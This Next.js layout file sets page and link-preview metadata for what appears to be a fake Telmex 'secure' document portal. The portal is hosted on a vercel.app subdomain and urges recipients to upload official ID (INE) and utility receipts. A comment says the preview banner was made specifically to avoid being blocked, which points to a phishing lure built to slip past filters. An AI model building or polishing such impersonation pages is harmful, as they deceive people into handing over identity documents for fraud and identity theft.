import { Metadata } from 'next';
import { NotifyProvider } from '@/components/NotifyProvider';

export const metadata: Metadata = {
    title: 'Portal de Contratación | Telmex',
    description: 'Envío de documentos 100% seguro para continuar con tu proceso de contratación con Telmex.',
    openGraph: {
        title: '🔒 Portal Seguro Telmex | Envío de Documentos',
        description: 'Adjunta tus requisitos oficiales (INE, recibo, etc.) en este enlace para agilizar tu trámite de contratación con Telmex Infinitum. Proceso rápido y seguro.',
        type: 'website',
        siteName: 'Telmex',
        locale: 'es_MX',
        images: [
            {
                // Un banner profesional y seguro generado específicamente para evitar bloqueos
                url: 'https://telmex-panel.vercel.app/og-telmex.png',
                width: 1200,
                height: 630,
                alt: 'Portal Web Telmex - Envío Seguro',
            }
        ]
    },
    twitter: {
        card: 'summary_large_image',
        title: '🔒 Portal Seguro Telmex | Envío de Documentos',
        description: 'Adjunta tus requisitos oficiales (INE, recibo, etc.) en este enlace para agilizar tu trámite de contratación con Telmex Infinitum.',
        images: ['https://telmex-panel.vercel.app/og-telmex.png'],
    }
};

// Layout limpio para el portal público de clientes — sin sidebar ni nav del panel
export default function DocsLayout({ children }: { children: React.ReactNode }) {
    return <NotifyProvider>{children}</NotifyProvider>;
}
